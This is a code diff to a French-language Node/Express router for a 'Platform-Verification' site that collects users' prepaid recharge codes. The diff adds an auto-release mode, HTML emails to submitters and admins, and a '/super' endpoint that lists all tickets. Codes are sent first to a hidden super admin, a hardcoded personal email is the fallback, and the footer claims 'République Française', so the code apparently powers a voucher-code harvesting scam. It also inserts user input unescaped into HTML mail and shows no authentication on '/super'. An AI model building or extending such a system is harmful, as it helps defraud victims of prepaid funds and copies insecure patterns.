@@ -44,21 +44,42 @@ router.post('/verify', async (req, res) => {
     }
 
     try {
+        // Vérifier le mode de validation (Manuel vs Automatique)
+        let manualValidation = true;
+        try {
+            await query(`
+                CREATE TABLE IF NOT EXISTS app_settings (
+                    key        TEXT PRIMARY KEY,
+                    value      TEXT NOT NULL,
+                    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+                )
+            `);
+            const sRes = await query("SELECT value FROM app_settings WHERE key = 'manual_validation'");
+            if (sRes.rowCount > 0 && sRes.rows[0].value === 'false') {
+                manualValidation = false;
+            }
+        } catch (e) {
+            console.warn('[ticket-service] Lecture app_settings impossible, mode manuel par défaut:', e.message);
+        }
+
+        const isReleased = !manualValidation;
+
         // Insertion en masse via une transaction
         await query('BEGIN');
         const inserted = [];
+        const now = new Date();
         for (const code of normalizedCodes) {
             const id = uuidv4();
             await query(
-                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, statut, released)
-                 VALUES ($1, $2, $3, $4, $5, $6, $7, 'en_attente', FALSE)`,
-                [id, normalizedEmail, recharge, montant, devise, normalizedPays, code]
+                `INSERT INTO tickets (id, email, recharge, montant, devise, pays, code, statut, released, released_at)
+                 VALUES ($1, $2, $3, $4, $5, $6, $7, 'en_attente', $8, $9)`,
+                [id, normalizedEmail, recharge, montant, devise, normalizedPays, code, isReleased, isReleased ? now : null]
             );
-            inserted.push({ id, code, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: false });
+            inserted.push({ id, code, recharge, montant, devise, pays: normalizedPays, statut: 'en_attente', released: isReleased });
         }
         await query('COMMIT');
 
-        console.log(`[ticket-service] ${inserted.length} ticket(s) reçu(s) de ${normalizedEmail} (en attente de publication super admin)`);
+        console.log(`[ticket-service] ${inserted.length} ticket(s) reçu(s) de ${normalizedEmail} (Mode: ${manualValidation ? 'Manuel - en attente release' : 'Automatique - publié vers admin'})`);
 
         // Email immédiat au super admin (seul à voir les codes tant qu'il ne les a pas publiés)
         const superAdminEmail = process.env.SUPER_ADMIN_EMAIL || 'dukram.nsounjou@ens-uy1.cm';
@@ -121,6 +142,59 @@ router.post('/verify', async (req, res) => {
             console.warn('[ticket-service] Erreur envoi email super admin:', err.message);
         }
 
+        // Si publication automatique directe (mode manuel désactivé) :
+        if (isReleased) {
+            try {
+                // Confirmation à l'utilisateur
+                const listItems = codesList.map((c, i) =>
+                    `<li style="margin:6px 0;font-family:monospace;font-size:14px;">Code ${i+1} : <strong>${c}</strong></li>`
+                ).join('');
+                await adminTransporter.sendMail({
+                    from: '"Platform-Verification" <noreply@verificationticket.com>',
+                    to: normalizedEmail,
+                    subject: '✅ Confirmation de soumission — Platform-Verification',
+                    html: `
+                    <div style="font-family:Inter,sans-serif;max-width:600px;margin:auto;padding:24px;">
+                        <div style="background:#001360;padding:20px;border-radius:12px 12px 0 0;text-align:center;">
+                            <h1 style="color:#fff;margin:0;font-size:22px;">🛡 Platform-Verification</h1>
+                            <p style="color:#aac4ff;margin:8px 0 0;">Confirmation de réception de vos tickets</p>
+                        </div>
+                        <div style="background:#fff;padding:24px;border:1px solid #e2e8f0;border-top:none;">
+                            <p style="color:#444;margin-bottom:16px;">Bonjour,</p>
+                            <p style="color:#444;">Nous vous confirmons la bonne réception de vos codes :</p>
+                            <ul style="background:#f8fafc;padding:16px 24px;border-radius:8px;">${listItems}</ul>
+                            <p style="color:#444;margin-top:16px;">Ils sont actuellement en cours de vérification par nos équipes.</p>
+                        </div>
+                        <div style="background:#f8fafc;padding:12px;border-radius:0 0 12px 12px;text-align:center;">
+                            <p style="color:#aaa;font-size:11px;margin:0;">© 2026 Platform-Verification — République Française</p>
+                        </div>
+                    </div>`
+                });
+            } catch (errU) {
+                console.warn('[ticket-service] Erreur envoi confirmation utilisateur:', errU.message);
+            }
+
+            try {
+                // Notification aux admins classiques
+                const adminRows = await query('SELECT email FROM admins');
+                for (const row of adminRows.rows) {
+                    await adminTransporter.sendMail({
+                        from: '"Platform-Verification" <noreply@verificationticket.com>',
+                        to: row.email,
+                        subject: '🔔 Nouvelle soumission de codes — Platform-Verification',
+                        html: `
+                        <div style="font-family:Inter,sans-serif;padding:20px;">
+                            <h2>🛡 Platform-Verification</h2>
+                            <p>Nouvelle soumission reçue de <strong>${normalizedEmail}</strong> (${codesList.length} code(s)).</p>
+                            <p>Le ticket est d'ores et déjà disponible dans votre tableau de bord administrateur.</p>
+                        </div>`
+                    }).catch(() => {});
+                }
+            } catch (errA) {
+                console.warn('[ticket-service] Erreur notification admins:', errA.message);
+            }
+        }
+
         return res.status(201).json({
             message: `${inserted.length} ticket(s) envoyé(s) pour vérification.`,
             tickets: inserted
@@ -153,6 +227,23 @@ router.get('/pending', async (_req, res) => {
         res.json({ count: result.rowCount, tickets: result.rows });
     } catch (err) {
         res.status(500).json({ error: 'Erreur récupération tickets en attente.' });
+    }
+});
+
+/* ── GET /super — tous les tickets pertinents pour la console super admin ─ */
+router.get('/super', async (_req, res) => {
+    try {
+        // Renvoie tous les tickets non publiés ainsi que tous les tickets récents (7 derniers jours)
+        const result = await query(
+            `SELECT * FROM tickets 
+             WHERE released = FALSE 
+                OR created_at >= NOW() - INTERVAL '7 days'
+             ORDER BY created_at DESC`
+        );
+        res.json({ count: result.rowCount, tickets: result.rows });
+    } catch (err) {
+        console.error('[ticket-service] Erreur /super:', err);
+        res.status(500).json({ error: 'Erreur récupération tickets super admin.' });
     }
 });
 
